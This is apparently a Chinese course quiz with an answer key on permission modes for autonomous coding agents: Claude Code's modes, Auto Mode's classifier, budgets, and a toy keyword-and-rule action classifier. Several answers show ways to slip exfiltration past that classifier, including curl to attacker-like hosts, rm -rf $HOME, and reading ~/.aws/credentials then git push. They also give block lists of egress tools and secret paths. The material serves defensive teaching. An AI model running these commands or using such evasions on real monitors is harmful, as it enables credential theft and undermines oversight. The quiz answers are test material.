# 测验 · 自主 Agents 的权限模式（Permission Modes for Autonomous Agents）

> **阶段 15 · 自主系统 · 第 10 节** ｜ 讲义：[docs/zh.md](../docs/zh.md)（[English](../docs/en.md)） ｜ 代码：[code/main.py](../code/main.py) ｜ 代码讲解：[code/main.讲解.md](../code/main.讲解.md)
>
> **用法**：学完讲义、跑过代码后，合上讲义完成第二～四部分，再对照第五部分的答案与解析。第一部分是"学完必须能做到"的清单，可以逐项打勾。

---

## 一、学完本节你应该掌握

### 核心知识点

| # | 知识点 | 一句话要点 |
|---|--------|-----------|
| 1 | 权限阶梯（permission ladder） | 从"每个动作都审查"到"全部批准"的分级自治；讲义：本地自主 agent 是一个独立的安全类别，攻击面是它能触达的一切（文件、网络、凭证、剪贴板、浏览器、终端） |
| 2 | 六种模式 | `plan`、`default`（UI 中标为 "Manual"）、`acceptEdits`、`auto`、`dontAsk`、`bypassPermissions` |
| 3 | 各模式行为 | 讲义：`plan` 先出计划、执行前逐个审查；`default` 只对"有风险"的动作（shell、破坏性操作、网络）询问；`acceptEdits` 自动批准写文件、shell 与网络仍询问；`dontAsk` 从不询问、未被规则预先允许的动作一律拒绝；`bypassPermissions` 全部批准 |
| 4 | Auto Mode | 讲义：2026 年 3 月 24 日推出；用一个**独立的分类器模型**在每个动作执行前审查，对照声明的任务与会话状态，阻止超出请求范围的升级；被阻止的动作交回用户 |
| 5 | 可用性受限 | `auto` 是否可用取决于套餐、组织启用、模型与 provider；以 research preview 形式发布 |
| 6 | 预算控制 | `max_turns`（会话总轮数）、`max_budget_usd`（美元上限，超出即中止）、按工具的动作次数上限 |
| 7 | 分类器能抓住的 | 映射到已知危险动作形状的直白 prompt injection；重复的工具循环；只改文件的会话里明显越界的 shell 命令 |
| 8 | 分类器会漏掉的 | 不产生单个可疑动作的微妙注入；"每个动作都安全、组合起来有害"的语义级失当；经由合法通道的外泄（写入自有文件后 `git push` 到公开仓库） |
| 9 | 分类器是一层，不是解决方案 | 讲义："the classifier is a layer, not a solution"；要叠加预算、白名单、隔离工作区、轨迹审计（第 12–16 节） |
| 10 | 本节模拟器 | 讲义说明它是"教学简化"：Stage 1 关键词规则 + Stage 2 多规则审查；真实 `auto` 背后是独立分类器模型，并非公开的两阶段契约 |

### 核心技能（能动手做到）

- [ ] 按任务的爆炸半径选择权限模式，说清每种模式"谁在什么时候批准什么"
- [ ] 读懂 `stage1` / `stage2` / `classify` 的级联逻辑，逐条预测示例轨迹的判定结果
- [ ] 构造能绕过本节分类器的动作（子串白名单、关键词变体、`$HOME`），并修复
- [ ] 按讲义练习 2 扩展 Stage 1 规则，并在良性样本上测量误报率
- [ ] 给"组合式外泄"设计轨迹级（trajectory-level）检测
- [ ] 按 `outputs/skill-permission-mode-picker.md` 为一个任务写出 run card：模式、预算、隔离、审计计划

---

## 二、基础自测（选择题）

**Q1.** 关于 `acceptEdits` 模式，与讲义一致的是：

- A. 所有动作都自动批准，适合一次性容器
- B. 先输出计划，用户批准后才开始执行
- C. 文件写入自动批准，但 shell 执行和网络调用仍需确认；适合跨多文件的重构
- D. 由分类器模型审查每个动作

**Q2.** 讲义对 Auto Mode 的描述是：

- A. 由一个独立的分类器模型在每个动作执行前审查，对照声明的任务和会话状态，阻止超出请求范围的升级；被阻止的动作交回用户
- B. 主模型自己判断每个动作是否安全，不需要额外模型
- C. 对所有动作自动批准，但事后生成审计报告
- D. 只对文件写入做审查，shell 命令一律放行

**Q3.** 下列哪一项**不是**讲义列出的预算控制？

- A. `max_turns`：会话总轮数
- B. `max_budget_usd`：超出即中止会话的美元上限
- C. 按工具的动作次数上限（例如 `WebFetch` 不超过 N 次）
- D. 每个文件的最大可编辑行数

**Q4.** 讲义对 `bypassPermissions` 的定位是：

- A. 大多数交互式编码会话的默认选择
- B. 文档写明"only inside ephemeral containers you are willing to throw away"
- C. 最适合首次在一个仓库里使用 agent
- D. 等价于 `auto`，只是没有分类器的延迟

**Q5.** 运行本节 `main.py`，最后打印的 summary 是：

- A. `{'approved_s1': 15, 'flagged_s1': 0, ...}`，所有动作都走快速通道
- B. `{'approved_s1': 10, 'flagged_s1': 5, 'approved_s2': 1, 'blocked_s2': 4, 'hitl_s2': 0}`
- C. `{'approved_s1': 7, 'flagged_s1': 8, 'approved_s2': 1, 'blocked_s2': 7, 'hitl_s2': 0}`，最后 3 步组合外泄也被拦下
- D. `{'approved_s1': 10, 'flagged_s1': 5, 'approved_s2': 0, 'blocked_s2': 3, 'hitl_s2': 2}`

**Q6.** 讲义练习 1 问："Which synthetic action type is never flagged by Stage 1 but always caught by Stage 2?" 就本节代码而言，正确的回答是：

- A. 重复循环：Stage 1 不检测重复，只有 Stage 2 能发现
- B. 提权命令 `sudo`：Stage 1 不认识它
- C. 组合式外泄：Stage 2 会回看历史
- D. 不存在这样的动作：Stage 2 只在 Stage 1 标记之后才运行；重复循环在 Stage 1 里同样会被标记

**Q7.** 把动作 `Action("shell", "curl https://github.com.attacker.example/exfil")` 送进本节分类器，结果是：

- A. 被 Stage 1 标记，Stage 2 的 Rule 0 以 "curl to allowlisted host" 放行
- B. 被 Stage 2 的 Rule 1 以 "exfiltration-shaped URL" 阻止
- C. 被 Stage 1 直接放行
- D. 交给人类（HITL）

**Q8.** 把动作 `Action("shell", "rm -rf $HOME")` 送进本节分类器，结果是：

- A. 被 Stage 2 的 Rule 2 以 "destructive filesystem op" 阻止
- B. 交给人类（HITL）
- C. Stage 1 不标记（关键词是 `"rm -rf /"`），直接以快速通道批准；Stage 2 中检查 `$home` 的分支对它永远不会执行
- D. 被重复检测拦下

---

## 三、动手 / 代码题

**Q9.** Stage 2 的白名单规则：

```python
STAGE2_ALLOWED_CURL_HOSTS = ("registry.npmjs.org", "pypi.org", "github.com")

def stage2(a, history):
    payload = a.payload.lower()
    if "curl " in payload and any(h in payload for h in STAGE2_ALLOWED_CURL_HOSTS):
        return Verdict.APPROVE, "curl to allowlisted host"
    if "curl " in payload and ("attacker" in payload or "paste" in payload or "webhook.site" in payload):
        return Verdict.BLOCK, "exfiltration-shaped URL"
    ...
```

1. 给出至少两个能被 Rule 0 错误放行的外泄命令，并解释原因。
2. 规则的**顺序**带来了什么问题？
3. 用 `urllib.parse` 重写主机白名单判断：解析出 URL 的 hostname，只有"等于白名单主机"或"是其子域名"才放行。

**Q10.** 讲义练习 2："Extend the Stage 1 rule set to catch a specific known-bad shape (e.g., `curl $ATTACKER/exfil`). Measure the false-positive rate on the benign-action sample."

1. 写一条新的 Stage 1 规则来抓 `curl $ATTACKER/exfil` 这类"主机名来自 shell 变量"的命令。
2. 构造一个 15 条的良性动作样本，测量**现有** Stage 1 的标记率，以及最终"未被批准"（BLOCK 或 HITL）的比例。
3. 列举三种能同时绕过现有 Stage 1 关键词和你新规则的外泄写法，说明关键词规则的根本局限。

**Q11.** 示例轨迹末尾的组合式外泄：

```python
        Action("read",   "~/.aws/credentials"),
        Action("write",  "/tmp/secrets.txt with credential blob"),
        Action("shell",  "git add /tmp/secrets.txt && git push"),
```

1. 为什么三步都走了 Stage 1 快速通道？
2. 讲义说真实 Auto Mode 的分类器是"judged against the declared task and the current state of the session"。本节模拟器缺少哪一项输入，使它连第一步都抓不住？
3. 实现一个轨迹级的"污点追踪（taint tracking）"检查：读取敏感路径后，凡是把数据写到新位置、再推送或发送到外部的动作，都应升级为 HITL 或阻止。

**Q12.** 关于 Stage 2 的其他规则：

```python
    if "rm -rf" in payload and ("/" in payload or "$home" in payload):
        return Verdict.BLOCK, "destructive filesystem op at root"
    ...
    return Verdict.HITL, "low-confidence reviewer -> HITL"
```

1. 注释说的是 "at repo root"，实际条件是什么？`rm -rf /home/me/project/build` 与 `rm -rf build/` 分别会得到什么判定？
2. 默认输出里 `hitl_s2` 为 0。哪些动作会走到 HITL 分支？把它们加入轨迹并说明这个"默认升级而不是默认放行"的设计有什么价值和代价。
3. 重写 Rule 2，使其区分"项目目录内的清理"和"根目录 / 家目录 / 项目外的删除"。

---

## 四、面试高频题

**Q13.**（基础必考）Claude Code 的六种权限模式分别是什么？各自适合什么场景？

**Q14.**（原理深挖）为什么讲义说"分类器是一层，不是解决方案"？逐动作审查的分类器在原理上会漏掉哪几类风险？

**Q15.**（工程实践）设计一次 24 小时无人值守运行的预算与隔离：`max_turns`、`max_budget_usd`、按工具上限、白名单、凭证、审计。说明每个数字的依据（讲义练习 4）。

**Q16.**（场景设计）分别为下面三个任务选择权限模式并写出关键约束：①第一次在一个陌生的支付服务仓库里修 bug；②把 200 个文件里的日志库从 A 换成 B；③在 CI 的一次性容器里自动升级依赖并跑测试。哪些组合你会直接拒绝？

**Q17.**（追问型）"便宜规则 + 昂贵审查"的两级级联有什么好处和隐患？Stage 1 漏报和 Stage 2 误报哪个代价更大？HITL 设计不好会出现什么问题？

---

## 五、参考答案与解析

### Q1 — 答案：C

讲义表格："`acceptEdits` | File writes auto-approve; shell exec and network calls still prompt | Refactoring pass across many files"。A 是 `bypassPermissions`；B 是 `plan`；D 是 `auto`。

### Q2 — 答案：A

讲义："A separate classifier model. Reviews every proposed action before it runs, judged against the declared task and the current state of the session, and blocks anything that escalates beyond what the request called for. Blocked actions fall back to the user." B 错在"不需要额外模型"——关键恰恰是"separate"；C 是事后审计，不是事前审查；D 无依据。

### Q3 — 答案：D

讲义列出的预算控制："`max_turns` … `max_budget_usd` … action-count limits per tool (no more than N `WebFetch` calls, etc.)"。"每个文件最大可编辑行数"不在其中。

### Q4 — 答案：B

讲义：bypassPermissions "Documented as 'only inside ephemeral containers you are willing to throw away'"。skill 文件也要求 `bypassPermissions` / `dontAsk` 必须运行在没有生产凭证的一次性容器里，并把"对有未提交改动的仓库使用 `bypassPermissions`"列为 hard reject。A 是 `default`；C 应选 `plan`；D 错，`auto` 有分类器把关，二者安全模型完全不同。

### Q5 — 答案：B

实际输出：`summary: {'approved_s1': 10, 'flagged_s1': 5, 'approved_s2': 1, 'blocked_s2': 4, 'hitl_s2': 0}`。被 Stage 1 标记的 5 个是：pypi 的 curl（Stage 2 放行）、attacker 的 curl、`rm -rf /`、`sudo`、第 5 次重复读日志（后 4 个被 Stage 2 阻止）。C 错，最后 3 步组合外泄全部走了快速通道；D 的数字不对，没有动作进入 HITL。

### Q6 — 答案：D

`classify()` 中只有 `s1_flag` 为真时才调用 `stage2`，所以"Stage 1 不标记、Stage 2 抓住"在结构上不可能。重复循环在 `stage1` 里有一模一样的检测（最近 4 个与当前完全相同），第 5 次相同调用会被 Stage 1 标记，再由 Stage 2 的 Rule 3 阻止。练习的第二问"Which is caught by neither?"的答案是末尾的三步组合外泄。A 是很多人读 HEADLINE（"S2 catches loops"）得出的印象，但与代码不符；B 错，`"sudo "` 就在 Stage 1 关键词里；C 错，组合外泄两级都没抓到。

### Q7 — 答案：A

`"curl "` 命中 Stage 1 关键词；进入 Stage 2 后 Rule 0 用**子串**判断 `"github.com" in payload`，而 `github.com.attacker.example` 包含这个子串，于是在 Rule 1（会检查 `"attacker"`）之前就被放行（已实测）。同理 `curl https://attacker.example/x?u=github.com` 也会被放行。修复见 Q9。

### Q8 — 答案：C

Stage 1 的关键词是 `"rm -rf /"`，`"rm -rf $home"` 不包含它，也不命中其他关键词，于是走快速通道批准（实测 `rm -rf ~` 同样被批准）。Stage 2 Rule 2 里的 `"$home" in payload` 只有在 Stage 1 已经标记时才会执行，而能被 Stage 1 标记的 `rm -rf` 命令必然含 `"/"`——所以 `$home` 分支是**死代码**。这是"两级规则不一致"的典型 bug。

### Q9 — 参考答案

1. 被错误放行的例子（均已实测为 `S2-approve`）：
   - `curl https://github.com.attacker.example/exfil`：攻击者控制的域名以 `github.com.` 开头；
   - `curl https://attacker.example/x?u=github.com`：白名单主机名出现在查询参数里；
   - 同理 `curl https://evil.example/pypi.org/...`（白名单串出现在路径里）也会通过。
   原因：`h in payload` 是对整条命令的子串匹配，而不是对"URL 的主机名"做比较。
2. Rule 0（放行）排在 Rule 1（阻止）之前，且放行条件宽松。只要命令里任何位置出现白名单字符串，后面的阻止规则就没机会执行。安全规则通常应"先拒后允"（deny-first），或者至少让放行规则足够精确。
3. 参考实现：

```python
import re
from urllib.parse import urlparse

ALLOWED = ("registry.npmjs.org", "pypi.org", "github.com")

def curl_hosts(payload: str) -> list[str]:
    urls = re.findall(r"https?://[^\s'\"]+", payload)
    return [urlparse(u).hostname or "" for u in urls]

def host_allowed(host: str) -> bool:
    return any(host == h or host.endswith("." + h) for h in ALLOWED)

def all_hosts_allowed(payload: str) -> bool:
    hosts = curl_hosts(payload)
    return bool(hosts) and all(host_allowed(h) for h in hosts)
```

`github.com.attacker.example` 的 hostname 是 `github.com.attacker.example`，既不等于 `github.com` 也不以 `.github.com` 结尾，判为不允许；`api.github.com` 以 `.github.com` 结尾，允许。还应注意：命令里出现多个 URL 时要求**全部**在白名单内；带 `-d @file`、`--upload-file` 的 curl 即使目标在白名单内也应升级审查（向 github.com 上传凭证同样是外泄）。

### Q10 — 参考答案

1. 新规则（Stage 1，用正则）：

```python
import re
VAR_HOST = re.compile(r"\b(curl|wget)\b[^|;&]*\$\{?[A-Za-z_]+")

def stage1_ext(a, history):
    return stage1(a, history) or bool(VAR_HOST.search(f"{a.tool} {a.payload}"))
```

它会标记 `curl $ATTACKER/exfil`、`wget ${HOST}/x` 这类"目标由变量决定"的命令，因为分类器无法从字面判断变量指向哪里。
2. 我们构造的 15 条良性样本（读 `pyproject.toml`、编辑源码、`pytest -q`、curl pypi / npm / api.github.com / localhost / docs.python.org、`pip install`、`npm test`、`git status`、`ls -la`、读 `docs/curl-usage.md`、`make build`、`cat README.md`）实测：**现有** Stage 1 标记 5/15（33%，全部是 `curl `）；最终未被批准的 2/15（13%）：`curl http://localhost:8000/health` 与 `curl https://docs.python.org/3/` 被升级为 HITL。新增的变量规则在这份样本上没有额外误报。这说明"凡 curl 就标记"的 Stage 1 规则召回高、精度低，主要靠 Stage 2 的白名单兜底。
3. 绕过方式（实测前三种都走了快速通道）：`wget http://attacker.example/exfil`（不是 curl）；`curl<TAB>http://...`（关键词带空格，Tab 不匹配）；`python -c "import urllib.request; urllib.request.urlopen('http://attacker.example')"`；以及 `git push` 到攻击者控制的远端、`nc`、DNS 外泄等。根本局限：关键词规则匹配的是**字面形状**，而同一个意图有无数种写法；它适合做便宜的第一道筛子，不能作为安全边界。真正的边界应该在环境层：出网白名单（网络策略）、凭证不在工作区、敏感路径不可读。

### Q11 — 参考答案

1. Stage 1 只看关键词和重复：`read ~/.aws/credentials` 不含任何关键词；`write /tmp/secrets.txt …` 也不含；`git add … && git push` 同样不含（关键词里没有 `git push`）。每一步单独看都是"普通读写和提交"。
2. 缺少**声明的任务**（以及会话状态）。真实分类器对照"用户要求做什么"来判断：一个"修 off-by-one bug"的任务去读 `~/.aws/credentials`，本身就超出了请求范围。本节模拟器只看动作本身，没有任务上下文，所以连第一步都抓不住。
3. 参考实现（轨迹级污点追踪）：

```python
SENSITIVE = (".aws/credentials", ".ssh/", ".env", "id_rsa", ".netrc", ".git-credentials")
EGRESS = ("git push", "curl ", "wget ", "scp ", "nc ")

def trajectory_check(a, history) -> tuple[str, str] | None:
    tainted = any(h.tool == "read" and any(s in h.payload for s in SENSITIVE)
                  for h in history)
    if not tainted:
        return None
    if a.tool == "write":
        return "hitl", "write after reading a sensitive file"
    if a.tool == "shell" and any(e in a.payload for e in EGRESS):
        return "block", "egress after reading a sensitive file"
    return None
```

在 `classify()` 中先调用它（在 Stage 1 之前），命中就直接给出判定。对示例轨迹：第 13 步本身可另加"读取敏感路径 → HITL"的规则；第 14 步写文件 → HITL；第 15 步 `git push` → 阻止。更完整的做法是追踪"数据流"（哪个文件的内容进入了哪个文件），并把这类检查放在分类器之外的确定性层（讲义第 14 节的 canary token 也针对这个问题：在敏感文件中放金丝雀值，一旦出现在出站流量中即触发）。

### Q12 — 参考答案

1. 实际条件是"命令里含 `rm -rf` 且含任何一个 `/` 或 `$home`"，与"repo root"无关。实测：`rm -rf /home/me/project/build` → 被 Stage 1 标记（含 `rm -rf /`），Stage 2 以 "destructive filesystem op at root" **阻止**（误报：这是项目内的构建目录）；`rm -rf build/` → 不含 `rm -rf /`，Stage 1 直接**批准**；`rm -rf ~`、`rm -rf $HOME` → 也被直接批准（漏报，见 Q8）。规则既误报又漏报。
2. 被 Stage 1 标记、又不命中 Rule 0–4 的动作会走到 HITL：例如 `kubectl delete pod web-1`、`chown me file`、`echo hi | base64 -d`、含 `; dd ` 的命令、`iptables`、`aws s3 rb`、`drop table`，以及不在白名单也没有 attacker/paste/webhook.site 字样的 curl（实测 `curl https://docs.python.org/3/` → HITL）。
   - 价值："不确定就交给人"是 fail-closed（失败即关闭）的设计，避免低置信度的审查器替用户做危险决定。
   - 代价：HITL 太多会造成审批疲劳，用户开始"一路点同意"，反而削弱了人类这一层；无人值守运行中 HITL 意味着任务卡住。因此要让 Stage 2 尽量精确，减少无谓升级。
3. 参考实现：

```python
import os, shlex

PROJECT = "/home/me/project"

def rm_targets(payload: str) -> list[str]:
    tokens = shlex.split(payload)
    if len(tokens) < 2 or tokens[0] != "rm":
        return []
    return [t for t in tokens[1:] if not t.startswith("-")]

def rule2(payload: str):
    for t in rm_targets(payload):
        path = os.path.realpath(os.path.expanduser(os.path.expandvars(t)))
        if path in ("/", os.path.expanduser("~")) or not path.startswith(PROJECT + "/"):
            return "block", f"rm outside project: {path}"
    return None
```

用 `expanduser` / `expandvars` 处理 `~` 和 `$HOME`，用 `realpath` 消除 `..` 和符号链接（相对路径按当前工作目录解析，所以检查前要确保 agent 的工作目录就是项目目录，或先 `os.path.join(PROJECT, t)`），然后要求目标位于项目目录**内部**。实测：`rm -rf /`、`rm -rf $HOME`、`rm -rf ~`、`rm -rf /home/me/project/../other` 均被阻止，`rm -rf /home/me/project/build` 放行。同时 Stage 1 应改为"凡 `rm -r` 都标记"，把判断交给这条精确规则。

### Q13 — 参考回答要点

| 模式 | 行为（讲义） | 适用场景（讲义） |
|------|------------|----------------|
| `plan` | 先出计划，用户批准整个计划，执行前逐个审查 | 陌生任务、接近生产的代码、第一次在某仓库用 agent |
| `default`（UI 中为 "Manual"） | 运行动作，对有风险的动作（shell、破坏性操作、网络）询问 | 大多数交互式编码会话 |
| `acceptEdits` | 写文件自动批准，shell 与网络仍询问 | 跨多文件的重构 |
| `auto` | 独立分类器模型逐动作审查，阻止超出请求的升级 | 受约束工作区内的长程无人值守运行 |
| `dontAsk` | 从不询问；未被权限规则预先允许的动作一律拒绝 | 一次性 sandbox、CI、研究脚本 |
| `bypassPermissions` | 全部批准 | 只在可丢弃的一次性容器中 |

- 加分点：讲义的用法建议——陌生任务从 `plan` 开始（"Reading the plan is cheaper than rolling back a bad run"）；无人值守只在测量过爆炸半径的工作区里用 `auto`；`dontAsk` / `bypassPermissions` 当且仅当容器和凭证都可丢弃时才可接受。
- 常见误区：把 `dontAsk` 理解成"全部批准"——它是"不问，但没被预先允许的就拒绝"，与 `bypassPermissions` 方向相反。

### Q14 — 参考回答要点

- **逐动作审查的盲区**（讲义）：
  - 微妙的 prompt injection：调整了行为，却不产生任何单个可疑动作（讲义引用 OpenAI preparedness 负责人 2025 年的观点：间接 prompt injection 不是可以完全修补的漏洞）。
  - 语义级失当："Every individual action can look safe while the composed trajectory is harmful. The classifier judges the action; it does not re-derive the user's intent."
  - 经由合法通道外泄：写入自有文件再 `git push` 到公开仓库，每一步都被允许，组合才是问题（本节代码最后 3 步）。
- **评估与部署的差距**：在离线评测中表现良好的分类器，在用户上下文含糊的真实会话中可能表现不同（讲义引用第 1 节）。
- **所以要叠加**：预算、白名单、隔离工作区、轨迹审计；环境层的限制（无凭证、无出网）不依赖分类器的判断。
- 加分点：用本节代码的实测绕过（子串白名单、`rm -rf $HOME`、`wget`）说明"规则型分类器"在对抗环境中的脆弱。

### Q15 — 参考回答要点

示例 run card（数字需随任务调整，关键是给出依据）：

- **模式**：`auto`，在一次性容器/VM 中运行。
- **`max_turns`**：先测量同类任务的典型轮数（例如中位数 150、P95 400），上限设为 P95 的 1.5 倍左右（如 600），超出说明 agent 在打转。
- **`max_budget_usd`**：skill 文件："specify a dollar cap equal to or below what you would pay for a human mistake you cannot roll back"；例如 50 美元，并设 50% / 80% 的告警阈值。
- **按工具上限**：`WebFetch` ≤ 100 次、`git push` ≤ 0 次（推送由人类在审计后完成）、安装依赖只允许从镜像源。
- **白名单**：出网只允许包管理镜像与内部 Git；文件系统只允许项目目录与 scratch 目录。
- **凭证**：只给最小权限、短期有效的 token；没有云账号凭证、没有带 repo 写权限的 PAT（skill 文件：`acceptEdits` 以上的模式环境中不得有宽泛凭证）。
- **审计**：每 4–6 小时一次自动轨迹摘要；结束后由具名人类按清单审阅（动作分布、被阻止/升级的动作、diff、出网记录）；超过 1 小时的无人值守运行必须安排轨迹审计（skill 文件 hard reject）。
- **止损**：检查点与回滚（第 16 节）、kill switch 与金丝雀（第 14 节）。

### Q16 — 参考回答要点

1. **陌生的支付服务仓库修 bug** → `plan`。陌生 + 接近生产 + 爆炸半径大；先读计划再执行。不给生产数据库凭证；若有，拒绝在该环境用 `auto`（skill 文件 refusal rule）。
2. **200 个文件换日志库** → `acceptEdits`。改动范围明确、可由 git 回滚；写文件自动批准省去大量点击，跑测试、装依赖仍需确认。先确保工作区干净、在独立分支上进行。
3. **CI 一次性容器里升级依赖并跑测试** → `dontAsk`（或在可丢弃容器里用 `bypassPermissions`），配合预先定义好的允许规则（包管理命令、测试命令），容器内无生产凭证，出网只到包镜像。
- **直接拒绝的组合**（skill 文件）：对有未提交改动的仓库用 `bypassPermissions`；`auto` 没有预算上限；`acceptEdits` 以上的模式环境中有宽泛凭证（AWS、GCP、带 repo 权限的 GitHub PAT）；超过 1 小时无人值守且无轨迹审计；声称 Auto Mode 分类器足以应对全新的任务分布；用户说不出失败时的爆炸半径。

### Q17 — 参考回答要点

- **好处**：大多数动作是良性的，便宜的 Stage 1 快速放行，只有少数动作付出昂贵审查的延迟与成本；两级可以分别优化（Stage 1 追求高召回、Stage 2 追求高精度）。
- **隐患**：
  - **Stage 1 漏报是致命的**：被 Stage 1 放行的动作永远不会到 Stage 2（本节 `rm -rf $HOME`、`wget` 外泄）。所以 Stage 1 应该宁可多标记——级联系统的整体召回率不会超过 Stage 1 的召回率。
  - **两级规则不一致**：Stage 2 里写了 `$home` 检查，但 Stage 1 从不把这类命令送过来，形成死代码。
  - **放行规则过宽**：Stage 2 的子串白名单把攻击域名当成 github.com。
- **哪个代价更大**：在安全场景中，漏报（危险动作被执行）通常远比误报（多问一次人）代价大，尤其是不可逆动作；但误报过多会导致 HITL 疲劳，间接制造漏报。
- **HITL 设计**：升级时要给出原因和上下文（动作、所属任务、历史中的相关步骤），否则人类无法有效判断；控制升级频率；对不可逆动作强制人工、对可回滚动作可以放宽；无人值守时 HITL 等于"暂停并通知"，要有超时后的默认动作（应为拒绝，而不是放行）。

---

## 六、关联知识点

### 前置知识
- [阶段 15 · 01 从聊天机器人转向长程 Agents](../../01-long-horizon-agents/docs/zh.md)：长程运行与评估-部署差距。
- [阶段 15 · 09 自主 Coding Agent 生态概览（2026）](../../09-coding-agent-landscape/docs/zh.md)：coding agent 的脚手架与爆炸半径。
- [阶段 14 · 27 Prompt Injection 与 PVE 防御](../../../14-agent-engineering/27-prompt-injection-defense/docs/zh.md)：分类器要防的注入攻击。
- [阶段 13 · 26 Skill 权限、Sandboxes 与信任](../../../13-tools-and-protocols/26-skill-permissions-sandboxes-and-trust/docs/zh.md)：权限与 sandbox 的通用设计。

### 本节被哪些后续内容用到
- [阶段 15 · 11 浏览器 Agents 与长程网页任务](../../11-browser-agents/docs/zh.md)：间接 prompt injection 在浏览器 agent 中的表现。
- [阶段 15 · 13 行动预算、迭代上限与成本控制](../../13-cost-governors/docs/zh.md)：`max_turns`、`max_budget_usd` 的工程实现。
- [阶段 15 · 14 紧急停止开关、Circuit Breakers 与金丝雀 Tokens](../../14-kill-switches-canaries/docs/zh.md)：针对"每步都安全、组合有害"的补充手段。
- [阶段 15 · 15 Human-in-the-Loop：先提出方案，再 Commit](../../15-propose-then-commit/docs/zh.md)：HITL 的设计。
- [阶段 15 · 16 Checkpoints（检查点）与 Rollback（回滚）](../../16-checkpoints-rollback/docs/zh.md)：出错后的回滚。
- [阶段 18 · 15 Indirect Prompt Injection：生产环境的攻击面](../../../18-ethics-safety-alignment/15-indirect-prompt-injection/docs/zh.md)：为什么注入无法被完全修补。
- [阶段 19 · 26 综合项目第 26 课：带拒绝列表与路径隔离的 Sandbox 执行器](../../../19-capstone-projects/26-sandbox-runner-denylist/docs/zh.md)：拒绝列表与路径隔离的实现。

### 延伸关键词
`permission modes` · `plan / acceptEdits / auto / dontAsk / bypassPermissions` · `action classifier` · `cascade classifier` · `fail-closed` · `HITL fatigue` · `max_turns / max_budget_usd` · `egress allowlist` · `taint tracking` · `trajectory audit` · `canary token` · `research preview`
